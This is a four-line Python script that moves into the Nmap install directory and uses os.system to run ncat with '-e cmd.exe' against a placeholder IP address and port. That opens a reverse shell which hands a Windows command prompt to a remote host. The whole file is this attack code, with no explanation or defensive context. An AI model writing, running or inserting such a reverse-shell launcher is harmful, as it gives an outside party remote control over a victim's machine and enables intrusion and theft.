import os

os.chdir("C:/Program Files (x86)/Nmap/")
os.system('cmd /k "ncat -nv <IP Address> <Port> -e cmd.exe"')
